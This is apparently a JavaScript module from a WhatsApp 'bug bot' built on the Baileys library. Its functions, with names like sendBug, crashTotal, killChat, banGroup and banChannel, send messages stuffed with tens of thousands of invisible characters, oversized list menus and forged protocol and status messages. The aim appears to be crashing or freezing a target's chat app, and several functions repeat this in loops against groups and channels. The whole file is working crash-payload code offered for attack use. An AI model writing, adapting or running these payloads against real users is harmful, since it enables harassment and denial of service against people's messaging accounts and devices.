const { generateWAMessageFromContent, proto } = require('@whiskeysockets/baileys');

const invis = '\u200e'.repeat(50000);
const force = '\u200e'.repeat(10000);

async function sendBug(bad, jid, quoted) {
    await bad.relayMessage(jid, {
        documentMessage: {
            title: '☠️ ATIK MD BUG ☠️' + invis,
            jpegThumbnail: Buffer.alloc(0),
            mimetype: 'application/pdf',
            caption: '☠️ ATIK MD BUG ☠️' + invis
        }
    }, { quoted });
}

async function fcInvisHard(bad, jid, quoted) {
    await bad.relayMessage(jid, {
        contactMessage: {
            displayName: '☠️ ATIK MD HARD ☠️' + invis,
            vcard: 'BEGIN:VCARD\nVERSION:3.0\nFN:' + invis + '\nEND:VCARD'
        }
    }, { quoted });
}

async function delayHard(bad, jid, quoted) {
    for (let i = 0; i < 5; i++) {
        await bad.sendMessage(jid, { text: '☠️ ATIK MD DELAY ☠️' + invis }, { quoted });
    }
}

async function fcInvisIos(bad, jid, quoted) {
    await bad.relayMessage(jid, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: { title: '☠️ ATIK MD IOS ☠️' + invis, hasMediaAttachment: false },
                    body: { text: '☠️ ATIK MD IOS ☠️' + invis },
                    footer: { text: '☠️ ATIK MD IOS ☠️' + invis },
                    nativeFlowMessage: {
                        buttons: [{
                            name: 'single_select',
                            buttonParamsJson: JSON.stringify({
                                title: '☠️ ATIK MD IOS ☠️',
                                sections: [{
                                    title: '☠️ ATIK MD IOS ☠️',
                                    rows: Array(50).fill({ title: '☠️ ATIK MD IOS ☠️', id: 'bug' })
                                }]
                            })
                        }]
                    }
                }
            }
        }
    }, { quoted });
}

async function fcInvisGroup(bad, jid, quoted) {
    await bad.relayMessage(jid, {
        groupInviteMessage: {
            groupJid: jid,
            inviteCode: 'atikmdbug',
            inviteExpiration: 0,
            groupName: '☠️ ATIK MD GROUP ☠️' + invis,
            caption: '☠️ ATIK MD GROUP ☠️' + invis
        }
    }, { quoted });
}

async function invisBulldozer(bad, jid, quoted) {
    await sendBug(bad, jid, quoted);
    await fcInvisHard(bad, jid, quoted);
    await fcInvisIos(bad, jid, quoted);
}

async function fcInvisChannel(bad, jid, quoted) {
    await bad.relayMessage(jid, {
        newsletterInviteMessage: {
            newsletterJid: '120363409543800266@newsletter',
            newsletterName: '☠️ ATIK MD CHANNEL ☠️' + invis,
            caption: '☠️ ATIK MD CHANNEL ☠️' + invis
        }
    }, { quoted });
}

// New Advanced Bugs inspired by Paxley
async function crashTotal(bad, jid, quoted) {
    const doc = {
        key: { remoteJid: 'status@broadcast', participant: '0@s.whatsapp.net' },
        message: {
            documentMessage: {
                title: '🔥 ATIK MD TOTAL CRASH 🔥' + force,
                jpegThumbnail: Buffer.alloc(0),
                mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
                caption: '🔥 ATIK MD TOTAL CRASH 🔥' + force
            }
        }
    };
    await bad.relayMessage(jid, doc, { quoted });
}

async function killChat(bad, jid, quoted) {
    await bad.relayMessage(jid, {
        protocolMessage: {
            key: { remoteJid: jid, fromMe: false, id: 'ATIKKILL' },
            type: 2
        }
    }, { quoted });
    await bad.sendMessage(jid, { text: '💥 CHAT KILLED 💥' + invis }, { quoted });
}

async function spamPair(bad, jid, targetNumber) {
    // This is a placeholder logic for the pairing spam requested
    // In a real bot, this would loop or call a specific service
    await bad.sendMessage(jid, { text: `🚀 Starting Pairing Spam to ${targetNumber}...` });
}

async function banGroup(bad, jid, quoted) {
    for (let i = 0; i < 10; i++) {
        await fcInvisGroup(bad, jid, quoted);
        await crashTotal(bad, jid, quoted);
        await sendBug(bad, jid, quoted);
    }
}

async function banChannel(bad, jid, quoted) {
    for (let i = 0; i < 10; i++) {
        await fcInvisChannel(bad, jid, quoted);
        await crashTotal(bad, jid, quoted);
        await sendBug(bad, jid, quoted);
    }
}

module.exports = {
    sendBug,
    fcInvisHard,
    delayHard,
    fcInvisIos,
    fcInvisGroup,
    invisBulldozer,
    fcInvisChannel,
    crashTotal,
    killChat,
    spamPair,
    banGroup,
    banChannel
};
